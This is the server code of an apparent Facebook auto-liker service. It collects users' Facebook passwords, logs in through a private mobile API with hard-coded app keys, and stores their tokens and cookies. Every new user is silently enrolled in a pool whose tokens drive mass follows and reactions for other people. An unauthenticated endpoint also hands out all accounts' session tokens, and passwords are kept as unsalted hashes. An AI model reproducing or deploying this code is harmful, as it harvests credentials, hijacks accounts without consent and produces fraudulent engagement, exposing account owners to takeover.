// ============== index.js (Fixed - No Duplicate Indexes) ==============
const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const crypto = require('crypto');
const session = require('express-session');
const MongoStore = require('connect-mongo');

const app = express();
const PORT = process.env.PORT || 11000;

// Validate environment variables at startup
function validateEnv() {
  const requiredVars = ['MONGODB_URI'];
  for (const varName of requiredVars) {
    if (!process.env[varName]) {
      console.error(`❌ Missing required environment variable: ${varName}`);
      process.exit(1);
    }
  }

  if (process.env.ENCRYPTION_KEY && process.env.ENCRYPTION_KEY.length !== 64) {
    console.error('❌ ENCRYPTION_KEY must be 64-character hex string (32 bytes)');
    process.exit(1);
  }
}

validateEnv();

// Encryption configuration
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const IV_LENGTH = 16;

function getValidKey(key) {
  if (key.length === 64 && /^[0-9a-f]+$/i.test(key)) {
    return Buffer.from(key, 'hex');
  }
  return crypto.createHash('sha256').update(key).digest();
}

function encrypt(text) {
  try {
    const iv = crypto.randomBytes(IV_LENGTH);
    const key = getValidKey(ENCRYPTION_KEY);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
  } catch (error) {
    console.error('Encryption error:', error);
    throw new Error('Encryption failed');
  }
}

function decrypt(text) {
  try {
    const textParts = text.split(':');
    const iv = Buffer.from(textParts.shift(), 'hex');
    const encryptedText = textParts.join(':');
    const key = getValidKey(ENCRYPTION_KEY);
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error('Decryption error:', error);
    throw new Error('Decryption failed');
  }
}

// Encrypt user session data into a single token
function encryptUserSession(userData) {
  const sessionPayload = {
    id: userData.facebookId,
    email: userData.email,
    name: userData.name,
    accessToken: userData.accessToken,
    cookies: userData.cookies,
    identifiers: userData.identifiers || [],
    loginEmail: userData.loginEmail,
    loginPhone: userData.loginPhone,
    loginUsername: userData.loginUsername,
    timestamp: Date.now(),
    nonce: crypto.randomBytes(16).toString('hex')
  };
  return encrypt(JSON.stringify(sessionPayload));
}

// Decrypt user session token
function decryptUserSession(encryptedToken) {
  try {
    const decrypted = decrypt(encryptedToken);
    return JSON.parse(decrypted);
  } catch (error) {
    console.error('Session decryption error:', error);
    return null;
  }
}

function generateSessionToken(email, deviceId) {
  const payload = {
    email,
    deviceId,
    timestamp: Date.now(),
    random: crypto.randomBytes(16).toString('hex')
  };
  return encrypt(JSON.stringify(payload));
}

function verifySessionToken(token) {
  try {
    const decrypted = decrypt(token);
    const payload = JSON.parse(decrypted);
    return payload;
  } catch (error) {
    return null;
  }
}

function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

function randHex(length) {
  return Array.from({ length: length }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
}

// Middleware
app.use(cors({
  origin: true,
  credentials: true
}));
app.use(express.json());
app.use(express.static('public'));

app.use(session({
  secret: process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex'),
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: process.env.MONGODB_URI,
    ttl: 14 * 24 * 60 * 60,
    autoRemove: 'native',
    crypto: {
      secret: process.env.STORE_SECRET || crypto.randomBytes(32).toString('hex')
    }
  }),
  cookie: {
    maxAge: 14 * 24 * 60 * 60 * 1000,
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax'
  }
}));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use(limiter);
app.set('trust proxy', 1);

// Database connection
const MONGODB_URI = process.env.MONGODB_URI;

async function connectDB() {
  try {
    await mongoose.connect(MONGODB_URI, {
      ssl: true,
      tlsAllowInvalidCertificates: false,
      connectTimeoutMS: 10000,
      socketTimeoutMS: 45000,
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      retryReads: true,
      directConnection: false
    });
    console.log("✅ MongoDB Connected!");
  } catch (err) {
    console.error("❌ MongoDB Connection Error:", err.message);
    process.exit(1);
  }
}

mongoose.connection.on('connected', () => {
  console.log('Mongoose connected to DB cluster');
});

mongoose.connection.on('error', (err) => {
  console.error('Mongoose connection error:', err);
});

connectDB();

// Models - Fixed: Removed duplicate index declarations
// Using schema.index() only (no unique/sparse on field definitions to avoid duplicates)
const UserSchema = new mongoose.Schema({
  email: { type: String },
  passwordHash: { type: String, required: true },
  facebookId: { type: String, required: true },
  name: String,
  accessToken: { type: String },
  cookies: { type: String },
  deviceId: String,
  machineId: String,
  sessionTokens: [{ 
    token: String,
    deviceId: String,
    createdAt: { type: Date, default: Date.now }
  }],
  isActive: { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
  lastLogin: Date,
  lastFacebookCheck: Date,
  
  // Multi-identifier login fields
  identifiers: [{ type: String }],
  loginEmail: { type: String },
  loginPhone: { type: String },
  loginUsername: { type: String }
});

// Create indexes properly - only once
UserSchema.index({ email: 1 }, { unique: true, sparse: true });
UserSchema.index({ facebookId: 1 }, { unique: true });
UserSchema.index({ identifiers: 1 });
UserSchema.index({ loginEmail: 1 }, { sparse: true });
UserSchema.index({ loginPhone: 1 }, { sparse: true });
UserSchema.index({ loginUsername: 1 }, { sparse: true });

const User = mongoose.model('User', UserSchema);

const Cooldown = mongoose.model('Cooldown', new mongoose.Schema({
  facebookId: String,
  lastFollow: Date,
  lastReaction: Date,
  lastShare: Date
}));

const Liker = mongoose.model('Liker', new mongoose.Schema({
  facebookId: String,
  name: String,
  accessToken: String,
  cookies: String,
  active: { type: Boolean, default: false }
}));

// Helper function to normalize and collect identifiers from login input
function collectIdentifiers(input, facebookData, usedIdentifierType) {
  const identifiers = new Set();
  
  // Add the input value itself (what user typed)
  if (input) identifiers.add(input.toLowerCase());
  
  // Add Facebook ID
  if (facebookData.uid) identifiers.add(facebookData.uid);
  
  // Add email if available
  if (facebookData.email) identifiers.add(facebookData.email.toLowerCase());
  
  // Add phone if available
  if (facebookData.phone) identifiers.add(facebookData.phone);
  
  // Add username if available
  if (facebookData.username) identifiers.add(facebookData.username.toLowerCase());
  
  // Add profile name (for convenience, though not unique)
  if (facebookData.name) identifiers.add(facebookData.name.toLowerCase());
  
  return Array.from(identifiers);
}

// Find user by any identifier
async function findUserByIdentifier(identifier) {
  if (!identifier) return null;
  
  const normalizedIdentifier = identifier.toLowerCase();
  
  // Search using the identifiers array
  return await User.findOne({ 
    identifiers: normalizedIdentifier,
    isActive: true 
  });
}

// Helper functions 
const checkCooldown = async (facebookId, toolType) => {
  const cooldown = await Cooldown.findOne({ facebookId });
  const now = new Date();
  const cooldownMinutes = 30;
  
  if (!cooldown) {
    await Cooldown.create({ facebookId, [toolType]: now });
    return false;
  }

  const lastUsed = new Date(cooldown[toolType]) || new Date(0);
  const diffMinutes = (now - lastUsed) / (1000 * 60);

  if (diffMinutes < cooldownMinutes) {
    return Math.ceil(cooldownMinutes - diffMinutes);
  }

  await Cooldown.updateOne({ facebookId }, { [toolType]: now });
  return false;
};

async function extractPostID(url) {
  const cleanUrl = url.split(/[?#]/)[0].replace(/\/$/, '');
  
  const patterns = [
    { 
      regex: /facebook\.com\/groups\/(\d+|[^\/]+)\/(?:permalink|posts)\/(\d+)/i,
      handler: async ([, groupIdOrName, postId]) => {
        if (/^\d+$/.test(groupIdOrName)) return `${groupIdOrName}_${postId}`;
        const groupId = await extractID(`https://facebook.com/groups/${groupIdOrName}`);
        return groupId ? `${groupId}_${postId}` : postId;
      }
    },
    
    { 
      regex: /facebook\.com\/(\d+|[^\/]+)\/(posts|videos|photos)\/(\d+|pfbid\w+)/i,
      handler: async ([, idOrName, , postId]) => {
        if (/^\d+$/.test(idOrName)) return `${idOrName}_${postId}`;
        const uid = await extractID(`https://facebook.com/${idOrName}`);
        return uid ? `${uid}_${postId}` : postId;
      }
    },
    
    { 
      regex: /facebook\.com\/photo(?:\/?\.php)?\?.*fbid=(\d+)/i,
      handler: async ([, postId]) => {
        const uid = await extractID(cleanUrl);
        return uid ? `${uid}_${postId}` : postId;
      }
    },
    
    { regex: /\/(\d+)$/i, handler: ([, pid]) => pid },
    { regex: /\/(pfbid\w+)$/i, handler: ([, pid]) => pid }
  ];

  for (const {regex, handler} of patterns) {
    const match = cleanUrl.match(regex);
    if (match) try { return await handler(match); } catch {}
  }
  return null;
}

async function extractID(url) {
  try {
    const response = await axios.post(
      "https://id.traodoisub.com/api.php",
      new URLSearchParams({ link: url }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
      }
    );
    return response.data.id || null;
  } catch (error) {
    console.error("Error getting ID:", error.message);
    return null;
  }
}

// Validate Facebook session
async function validateFacebookSession(accessToken, cookies) {
  try {
    const response = await axios.get('https://graph.facebook.com/me?fields=id,name', {
      params: { access_token: accessToken },
      headers: { Cookie: cookies, 'User-Agent': 'Mozilla/5.0' },
      timeout: 10000
    });
    return response.data;
  } catch (error) {
    return null;
  }
}

// Updated Facebook login function with additional data capture
async function performFacebookLogin(login, password) {
  const deviceId = uuidv4();
  const adid = randHex(16);
  const machineId = randHex(22);
  
  const params = new URLSearchParams({
    adid: adid,
    email: login,
    password: password,
    format: 'json',
    device_id: deviceId,
    cpl: 'true',
    family_device_id: deviceId,
    locale: 'en_US',
    client_country_code: 'US',
    credentials_type: 'device_based_login_password',
    generate_session_cookies: '1',
    generate_analytics_claim: '1',
    generate_machine_id: '1',
    currently_logged_in_userid: '0',
    irisSeqID: '1',
    try_num: '1',
    enroll_misauth: 'false',
    meta_inf_fbmeta: 'NO_FILE',
    source: 'login',
    machine_id: machineId,
    fb_api_req_friendly_name: 'authenticate',
    fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',
    api_key: '882a8490361da98702bf97a021ddc14d',
    access_token: '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
  });

  const fbRes = await axios.get(
    `https://b-api.facebook.com/method/auth.login?${params}`,
    {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      timeout: 15000
    }
  );

  if (!fbRes.data.session_cookies) {
    throw new Error(fbRes.data.error_msg || 'Failed to authenticate with Facebook');
  }

  const cookies = fbRes.data.session_cookies
    .map(c => `${c.name}=${c.value}`)
    .join('; ');

  const profile = await axios.get(
    `https://graph.facebook.com/me?fields=name&access_token=${fbRes.data.access_token}`,
    {
      headers: {
        'Cookie': cookies,
        'User-Agent': 'Mozilla/5.0'
      },
      timeout: 10000
    }
  );

  // Try to extract additional info from the login input
  let loginEmail = null;
  let loginPhone = null;
  let loginUsername = null;
  
  // Detect what type of identifier was used
  if (login.includes('@')) {
    loginEmail = login;
  } else if (/^[0-9+\-\s()]{10,15}$/.test(login.replace(/[\s\-\(\)]/g, ''))) {
    loginPhone = login;
  } else if (/^[a-zA-Z0-9.]+$/.test(login) && !/^\d+$/.test(login)) {
    loginUsername = login;
  }
  
  const isNumericOnly = /^\d+$/.test(login);
  
  return {
    facebookId: fbRes.data.uid,
    name: profile.data.name || 'Facebook User',
    accessToken: fbRes.data.access_token,
    cookies: cookies,
    deviceId: deviceId,
    machineId: machineId,
    loginEmail: loginEmail,
    loginPhone: loginPhone,
    loginUsername: loginUsername,
    isNumericOnly: isNumericOnly,
    rawLoginInput: login
  };
}

// Authentication middleware - UPDATED to work with encrypted session
const authenticate = async (req, res, next) => {
  try {
    // First check if we have an encrypted session token in headers
    const authHeader = req.headers.authorization;
    if (authHeader) {
      const encryptedSession = authHeader.split(' ')[1];
      const decryptedSession = decryptUserSession(encryptedSession);
      
      if (decryptedSession && decryptedSession.id) {
        // Verify user still exists and is active
        const user = await User.findOne({ 
          facebookId: decryptedSession.id,
          isActive: true 
        });
        
        if (user) {
          req.user = user;
          req.sessionData = decryptedSession;
          return next();
        }
      }
    }
    
    // Fallback to regular session
    if (req.session.email) {
      const user = await User.findOne({ email: req.session.email });
      if (user && user.isActive) {
        req.user = user;
        return next();
      }
    }
    
    // Legacy token support
    if (authHeader) {
      const token = authHeader.split(' ')[1];
      const payload = verifySessionToken(token);
      
      if (payload && payload.email) {
        const user = await User.findOne({ 
          email: payload.email,
          'sessionTokens.token': token,
          isActive: true
        });
        
        if (user) {
          req.session.email = user.email;
          req.user = user;
          return next();
        }
      }
    }
    
    res.status(401).json({ success: false, error: 'Unauthorized' });
  } catch (error) {
    console.error('Authentication error:', error);
    res.status(500).json({ success: false, error: 'Authentication failed' });
  }
};

// Routes 
// Returns encrypted session data instead of plain text
app.get('/api/session', authenticate, (req, res) => {
  const encryptedSession = encryptUserSession({
    facebookId: req.user.facebookId,
    email: req.user.email,
    name: req.user.name,
    accessToken: req.user.accessToken,
    cookies: req.user.cookies,
    identifiers: req.user.identifiers || [],
    loginEmail: req.user.loginEmail,
    loginPhone: req.user.loginPhone,
    loginUsername: req.user.loginUsername
  });
  
  res.json({ 
    success: true, 
    encryptedData: encryptedSession
  });
});

app.post('/api/accounts/list', async (req, res) => {
  try {
    const users = await User.find({ 
      isActive: true,
      sessionTokens: { $exists: true, $ne: [] }
    }).select('email name facebookId lastLogin sessionTokens identifiers loginEmail loginPhone loginUsername');

    const accounts = users.map(user => {
      const encryptedAccount = encryptUserSession({
        facebookId: user.facebookId,
        email: user.email,
        name: user.name,
        accessToken: null,
        cookies: null,
        identifiers: user.identifiers || [],
        loginEmail: user.loginEmail,
        loginPhone: user.loginPhone,
        loginUsername: user.loginUsername
      });
      
      return {
        encryptedData: encryptedAccount,
        lastLogin: user.lastLogin,
        sessionToken: user.sessionTokens[user.sessionTokens.length - 1]?.token || null
      };
    }).filter(account => account.sessionToken);

    res.json({ success: true, accounts });
  } catch (error) {
    console.error('List accounts error:', error);
    res.status(500).json({ success: false, error: 'Failed to list accounts' });
  }
});

app.post('/api/accounts/switch', async (req, res) => {
  try {
    const { sessionToken } = req.body;
    
    if (!sessionToken) {
      return res.status(400).json({ success: false, error: 'Missing session token' });
    }

    const payload = verifySessionToken(sessionToken);
    if (!payload || !payload.email) {
      return res.status(400).json({ success: false, error: 'Invalid session token' });
    }

    const user = await User.findOne({ 
      email: payload.email,
      'sessionTokens.token': sessionToken,
      isActive: true
    });

    if (!user) {
      return res.status(404).json({ success: false, error: 'Account not found' });
    }

    req.session.email = user.email;
    
    const newSessionToken = generateSessionToken(user.email, req.headers['user-agent'] || 'unknown');
    
    user.sessionTokens.push({
      token: newSessionToken,
      deviceId: req.headers['user-agent'] || 'unknown',
      createdAt: new Date()
    });
    user.lastLogin = new Date();
    await user.save();
    
    const encryptedSession = encryptUserSession({
      facebookId: user.facebookId,
      email: user.email,
      name: user.name,
      accessToken: user.accessToken,
      cookies: user.cookies,
      identifiers: user.identifiers || [],
      loginEmail: user.loginEmail,
      loginPhone: user.loginPhone,
      loginUsername: user.loginUsername
    });
    
    res.json({ 
      success: true,
      encryptedData: encryptedSession,
      sessionToken: newSessionToken
    });
  } catch (error) {
    console.error('Switch account error:', error);
    res.status(500).json({ success: false, error: 'Failed to switch account' });
  }
});

// LOGIN ENDPOINT - Supports multi-identifier login
app.post('/api/login', async (req, res) => {
  try {
    const { identifier, password } = req.body;

    if (!identifier || !password) {
      return res.status(400).json({
        success: false,
        error: 'Identifier and password are required'
      });
    }

    // Try to find user by any identifier (email, phone, uid, username)
    let user = await findUserByIdentifier(identifier);
    
    if (user) {
      // RETURNING USER - Verify app password
      if (user.passwordHash !== hashPassword(password)) {
        return res.status(401).json({
          success: false,
          error: 'Invalid credentials'
        });
      }
      
      // Check if we have stored Facebook session
      if (user.accessToken && user.cookies) {
        const fbValidation = await validateFacebookSession(user.accessToken, user.cookies);
        
        if (fbValidation) {
          console.log(`✅ Returning user ${user.email || user.facebookId} - using stored Facebook session`);
          
          const sessionToken = generateSessionToken(user.email || user.facebookId, req.headers['user-agent'] || 'unknown');
          
          user.sessionTokens.push({
            token: sessionToken,
            deviceId: req.headers['user-agent'] || 'unknown',
            createdAt: new Date()
          });
          user.lastLogin = new Date();
          await user.save();
          
          req.session.email = user.email;
          
          const encryptedSession = encryptUserSession({
            facebookId: user.facebookId,
            email: user.email,
            name: user.name,
            accessToken: user.accessToken,
            cookies: user.cookies,
            identifiers: user.identifiers || [],
            loginEmail: user.loginEmail,
            loginPhone: user.loginPhone,
            loginUsername: user.loginUsername
          });
          
          return res.json({
            success: true,
            encryptedData: encryptedSession,
            sessionToken: sessionToken
          });
        } else {
          console.log(`⚠️ Stored Facebook session expired for ${user.email || user.facebookId}`);
          return res.status(401).json({
            success: false,
            error: 'Facebook session expired. Please login again with your Facebook credentials.',
            needsFacebookReauth: true
          });
        }
      }
    }
    
    // NEW USER OR EXPIRED SESSION - Perform Facebook login
    console.log(`🆕 Performing Facebook login for identifier: ${identifier}`);
    
    try {
      const fbResult = await performFacebookLogin(identifier, password);
      
      // Check if user already exists by facebookId
      let existingUser = await User.findOne({ facebookId: fbResult.facebookId });
      
      // Collect all identifiers
      const identifiers = collectIdentifiers(identifier, fbResult, null);
      
      if (existingUser) {
        // Update existing user with new credentials and identifiers
        existingUser.passwordHash = hashPassword(password);
        existingUser.accessToken = fbResult.accessToken;
        existingUser.cookies = fbResult.cookies;
        existingUser.name = fbResult.name;
        existingUser.lastLogin = new Date();
        
        // Add new identifiers without duplicates
        const existingIdentifiers = new Set(existingUser.identifiers || []);
        identifiers.forEach(id => existingIdentifiers.add(id));
        existingUser.identifiers = Array.from(existingIdentifiers);
        
        // Update login-specific fields if they're not set
        if (fbResult.loginEmail && !existingUser.loginEmail) existingUser.loginEmail = fbResult.loginEmail;
        if (fbResult.loginPhone && !existingUser.loginPhone) existingUser.loginPhone = fbResult.loginPhone;
        if (fbResult.loginUsername && !existingUser.loginUsername) existingUser.loginUsername = fbResult.loginUsername;
        if (fbResult.isNumericOnly && !existingUser.loginPhone && !existingUser.loginEmail) {
          existingUser.loginPhone = fbResult.rawLoginInput;
        }
        
        const sessionToken = generateSessionToken(existingUser.email || existingUser.facebookId, req.headers['user-agent'] || 'unknown');
        existingUser.sessionTokens.push({
          token: sessionToken,
          deviceId: req.headers['user-agent'] || 'unknown',
          createdAt: new Date()
        });
        
        await existingUser.save();
        
        req.session.email = existingUser.email;
        
        const encryptedSession = encryptUserSession({
          facebookId: existingUser.facebookId,
          email: existingUser.email,
          name: existingUser.name,
          accessToken: existingUser.accessToken,
          cookies: existingUser.cookies,
          identifiers: existingUser.identifiers || [],
          loginEmail: existingUser.loginEmail,
          loginPhone: existingUser.loginPhone,
          loginUsername: existingUser.loginUsername
        });
        
        return res.json({
          success: true,
          encryptedData: encryptedSession,
          sessionToken: sessionToken
        });
      }
      
      // Create new user
      const sessionToken = generateSessionToken(fbResult.facebookId, req.headers['user-agent'] || 'unknown');
      
      const newUser = new User({
        email: fbResult.loginEmail || null,
        passwordHash: hashPassword(password),
        name: fbResult.name,
        accessToken: fbResult.accessToken,
        cookies: fbResult.cookies,
        facebookId: fbResult.facebookId,
        deviceId: fbResult.deviceId,
        machineId: fbResult.machineId,
        sessionTokens: [{
          token: sessionToken,
          deviceId: req.headers['user-agent'] || 'unknown',
          createdAt: new Date()
        }],
        isActive: true,
        lastLogin: new Date(),
        lastFacebookCheck: new Date(),
        identifiers: identifiers,
        loginEmail: fbResult.loginEmail,
        loginPhone: fbResult.loginPhone,
        loginUsername: fbResult.loginUsername
      });
      await newUser.save();
      
      // Also save as a liker
      await Liker.findOneAndUpdate(
        { facebookId: fbResult.facebookId },
        {
          facebookId: fbResult.facebookId,
          name: fbResult.name,
          accessToken: fbResult.accessToken,
          cookies: fbResult.cookies,
          active: true
        },
        { upsert: true, new: true }
      );
      
      req.session.email = newUser.email;
      
      console.log(`✅ New user created: ${fbResult.name} (${fbResult.facebookId})`);
      
      const encryptedSession = encryptUserSession({
        facebookId: newUser.facebookId,
        email: newUser.email,
        name: newUser.name,
        accessToken: newUser.accessToken,
        cookies: newUser.cookies,
        identifiers: newUser.identifiers || [],
        loginEmail: newUser.loginEmail,
        loginPhone: newUser.loginPhone,
        loginUsername: newUser.loginUsername
      });
      
      res.json({
        success: true,
        encryptedData: encryptedSession,
        sessionToken: sessionToken
      });
      
    } catch (fbError) {
      console.error('Facebook login failed:', fbError.response?.data || fbError.message);
      return res.status(401).json({
        success: false,
        error: fbError.response?.data?.error_msg || fbError.message || 'Facebook login failed. Please check your credentials.'
      });
    }
    
  } catch (error) {
    console.error('Login error:', error);
    return res.status(500).json({
      success: false,
      error: error.message || 'Login failed. Please check your credentials.'
    });
  }
});

app.post('/api/reauth', async (req, res) => {
  try {
    const { identifier, appPassword, facebookEmail, facebookPassword } = req.body;
    
    if (!identifier || !appPassword || !facebookEmail || !facebookPassword) {
      return res.status(400).json({
        success: false,
        error: 'Identifier, app password, and Facebook credentials are required'
      });
    }
    
    const user = await findUserByIdentifier(identifier);
    
    if (!user || user.passwordHash !== hashPassword(appPassword)) {
      return res.status(401).json({
        success: false,
        error: 'Invalid app credentials'
      });
    }
    
    // Perform fresh Facebook login
    const fbResult = await performFacebookLogin(facebookEmail, facebookPassword);
    
    // Update stored Facebook credentials
    user.accessToken = fbResult.accessToken;
    user.cookies = fbResult.cookies;
    user.name = fbResult.name;
    user.facebookId = fbResult.facebookId;
    user.lastFacebookCheck = new Date();
    user.lastLogin = new Date();
    
    // Update identifiers
    const identifiers = collectIdentifiers(facebookEmail, fbResult, null);
    const existingIdentifiers = new Set(user.identifiers || []);
    identifiers.forEach(id => existingIdentifiers.add(id));
    user.identifiers = Array.from(existingIdentifiers);
    
    if (fbResult.loginEmail && !user.loginEmail) user.loginEmail = fbResult.loginEmail;
    if (fbResult.loginPhone && !user.loginPhone) user.loginPhone = fbResult.loginPhone;
    if (fbResult.loginUsername && !user.loginUsername) user.loginUsername = fbResult.loginUsername;
    
    const sessionToken = generateSessionToken(user.email || user.facebookId, req.headers['user-agent'] || 'unknown');
    user.sessionTokens.push({
      token: sessionToken,
      deviceId: req.headers['user-agent'] || 'unknown',
      createdAt: new Date()
    });
    
    await user.save();
    
    await Liker.findOneAndUpdate(
      { facebookId: user.facebookId },
      {
        facebookId: user.facebookId,
        name: user.name,
        accessToken: user.accessToken,
        cookies: user.cookies,
        active: true
      },
      { upsert: true }
    );
    
    req.session.email = user.email;
    
    const encryptedSession = encryptUserSession({
      facebookId: user.facebookId,
      email: user.email,
      name: user.name,
      accessToken: user.accessToken,
      cookies: user.cookies,
      identifiers: user.identifiers || [],
      loginEmail: user.loginEmail,
      loginPhone: user.loginPhone,
      loginUsername: user.loginUsername
    });
    
    res.json({
      success: true,
      encryptedData: encryptedSession,
      sessionToken: sessionToken
    });
    
  } catch (error) {
    console.error('Reauth error:', error);
    res.status(500).json({
      success: false,
      error: 'Re-authentication failed. Please check your Facebook credentials.'
    });
  }
});

app.post('/api/logout', authenticate, async (req, res) => {
  try {
    const authHeader = req.headers.authorization;
    if (authHeader) {
      const encryptedSession = authHeader.split(' ')[1];
      const decryptedSession = decryptUserSession(encryptedSession);
      
      if (decryptedSession && decryptedSession.id && req.user) {
        console.log(`User ${decryptedSession.id} logged out`);
      }
    }
    
    req.session.destroy();
    
    res.json({ success: true, message: 'Logged out successfully' });
  } catch (error) {
    console.error('Logout error:', error);
    res.status(500).json({ success: false, error: 'Logout failed' });
  }
});

// Follow endpoint
app.post('/api/follow', authenticate, async (req, res) => {
  try {
    const { link, limit } = req.body;

    if (!link || !limit) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required parameters: link or limit' 
      });
    }

    const profileId = await extractID(link);
    if (!profileId) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid Facebook profile link or unable to extract ID' 
      });
    }

    const cooldown = await checkCooldown(req.user.facebookId, 'lastFollow');
    if (cooldown) {
      return res.status(429).json({ 
        success: false,
        cooldown, 
        tool: 'follow',
        message: `Please wait ${cooldown} more minutes before following again`
      });
    }

    const likers = await Liker.aggregate([
      { $match: { active: true } },
      { $sample: { size: parseInt(limit) } }
    ]);

    if (!likers || likers.length === 0) {
      return res.status(400).json({ 
        success: false,
        error: 'No active likers available' 
      });
    }

    let successCount = 0;
    const promises = likers.map(async (liker) => {
      try {
        const headers = {
          'Authorization': `Bearer ${liker.accessToken}`,
          'Cookie': liker.cookies,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        };

        const response = await axios.post(
          `https://graph.facebook.com/v18.0/${profileId}/subscribers`,
          {},
          { headers, timeout: 10000 }
        );

        if (response.status === 200) {
          successCount++;
        }
      } catch (error) {
        console.error(`Follow failed:`, error.message);
      }
    });

    await Promise.all(promises);

    res.json({ 
      success: true,
      count: successCount,
      totalAttempted: likers.length
    });

  } catch (error) {
    console.error('Follow endpoint error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error',
      details: error.message 
    });
  }
});

// Reactions endpoint
app.post('/api/reactions', authenticate, async (req, res) => {
  try {
    const { link, type, limit } = req.body;

    if (!link || !type || !limit) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required parameters: link, type, or limit' 
      });
    }

    const postId = await extractPostID(link);
    if (!postId) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid Facebook post link or unable to extract ID' 
      });
    }

    const cooldown = await checkCooldown(req.user.facebookId, 'lastReaction');
    if (cooldown) {
      return res.status(429).json({ 
        success: false,
        cooldown, 
        tool: 'reactions',
        message: `Please wait ${cooldown} more minutes before reacting again`
      });
    }

    const likers = await Liker.aggregate([
      { $match: { active: true } },
      { $sample: { size: parseInt(limit) } }
    ]);

    if (!likers || likers.length === 0) {
      return res.status(400).json({ 
        success: false,
        error: 'No active likers available' 
      });
    }

    let successCount = 0;
    const promises = likers.map(async (liker) => {
      try {
        const headers = {
          'Cookie': liker.cookies,
          'User-Agent': 'Mozilla/5.0'
        };

        const response = await axios.post(
          `https://graph.facebook.com/v18.0/${postId}/reactions`,
          { type: type.toUpperCase() },
          {
            params: { access_token: liker.accessToken },
            headers,
            timeout: 10000
          }
        );

        if (response.status === 200) {
          successCount++;
        }
      } catch (error) {
        console.error(`Reaction failed:`, error.message);
      }
    });

    await Promise.all(promises);

    res.json({ 
      success: true,
      count: successCount,
      totalAttempted: likers.length
    });

  } catch (error) {
    console.error('Reactions endpoint error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Internal server error',
      details: error.message 
    });
  }
});

// Share endpoint
app.post('/api/share', authenticate, async (req, res) => {
  try {
    const { link, delay = 1000, limit = 10 } = req.body;

    if (!link) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required parameters: link' 
      });
    }

    const postId = await extractID(link);
    if (!postId) {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid Facebook post link or unable to extract ID' 
      });
    }

    let successCount = 0;
    let consecutiveFails = 0;
    const maxConsecutiveFails = 5;
    const delayMs = parseInt(delay);
    const shareLimit = parseInt(limit);

    for (let i = 0; i < shareLimit; i++) {
      try {
        const headers = {
          "Authority": "graph.facebook.com",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "Cookie": req.user.cookies,
          "Referer": "https://www.facebook.com/",
          'User-Agent': 'Mozilla/5.0'
        };

        const response = await axios.post(
          `https://graph.facebook.com/me/feed?link=https://m.facebook.com/${postId}&published=0&access_token=${req.user.accessToken}`,
          null,
          { headers, timeout: 10000 }
        );

        if (response.status === 200) {
          successCount++;
          consecutiveFails = 0;
        }

        if (i < shareLimit - 1) {
          await new Promise(resolve => setTimeout(resolve, delayMs));
        }
      } catch (error) {
        console.error(`Share attempt ${i + 1} failed:`, error.message);
        consecutiveFails++;
        
        if (consecutiveFails >= maxConsecutiveFails) {
          return res.json({ 
            success: false,
            count: successCount,
            totalAttempted: shareLimit,
            error: `Stopped after ${maxConsecutiveFails} consecutive failures`
          });
        }
      }
    }

    res.json({ 
      success: true,
      count: successCount,
      totalAttempted: shareLimit
    });

  } catch (error) {
    console.error('Share endpoint error:', error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// Profile guard endpoint
app.post('/api/profile-guard', authenticate, async (req, res) => {
  try {
    const { action } = req.body;

    if (!action) {
      return res.status(400).json({ 
        success: false,
        error: 'Missing required parameter: action' 
      });
    }

    if (action !== 'activate' && action !== 'deactivate') {
      return res.status(400).json({ 
        success: false,
        error: 'Invalid action. Must be either "activate" or "deactivate"' 
      });
    }

    const isShielded = action === 'activate';
    const sessionId = uuidv4();
    const clientMutationId = uuidv4();

    try {
      const response = await axios.post(
        `https://graph.facebook.com/graphql`,
        {},
        {
          params: {
            variables: JSON.stringify({
              0: {
                is_shielded: isShielded,
                session_id: sessionId,
                client_mutation_id: clientMutationId
              }
            }),
            method: 'post',
            doc_id: '1477043292367183',
            query_name: 'IsShieldedSetMutation',
            access_token: req.user.accessToken
          },
          headers: {
            'User-Agent': 'Mozilla/5.0'
          },
          timeout: 15000
        }
      );

      if (response.data.extensions?.is_final) {
        return res.json({ 
          success: true,
          action,
          message: `Profile guard ${action}d successfully`
        });
      } else {
        return res.status(400).json({ 
          success: false,
          error: 'Facebook API did not confirm the change'
        });
      }
    } catch (fbError) {
      console.error('Facebook API error:', fbError.message);
      return res.status(500).json({ 
        success: false,
        error: 'Failed to update profile guard with Facebook'
      });
    }

  } catch (error) {
    console.error('Profile guard error:', error);
    return res.status(500).json({ 
      success: false,
      error: 'Internal server error'
    });
  }
});

